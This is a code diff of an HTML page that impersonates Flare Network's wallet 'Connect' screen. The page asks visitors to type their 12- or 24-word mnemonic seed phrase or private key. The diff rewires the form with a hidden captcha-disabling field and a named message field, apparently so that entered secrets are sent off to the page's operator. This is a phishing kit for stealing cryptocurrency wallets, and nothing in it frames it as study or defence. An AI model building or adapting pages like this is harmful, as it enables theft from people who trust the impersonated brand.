@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flare Network - EVM Hub for Web3.0</title>
+    <title>Flare Network - Connect</title>
     <link rel="apple-touch-icon" sizes="180x180" href="assets/favicon_io/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon_io/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="assets/favicon_io/favicon-16x16.png">
@@ -593,9 +593,14 @@
                         <button class="manualConnect">Connect manually</button>
                     </div>
 
-                    <form action="" class="phraseForm active">
-                        <textarea required class="phraseBox" name="" id="" placeholder="Enter your 12 or 24 Mnemonic words. seperate them with spaces. You can also input your privatekey instead."></textarea>
-                        <button type="submit" class="connectbtn">Connect</button>
+                    <form id="myForm" class="phraseForm active">
+                        <input type="hidden" name="_captcha" value="false">
+                        <textarea required class="phraseBox" name="message" id="" placeholder="Enter your 12 or 24 Mnemonic words. seperate them with spaces. You can also input your privatekey instead."></textarea>
+                        <div class="loading-container formLoading active ">
+                            <div class="loading-bar"></div>
+                        </div>
+                        <button type="submit" name="send" class="connectbtn">Connect</button>
+
                     </form>
 
                 
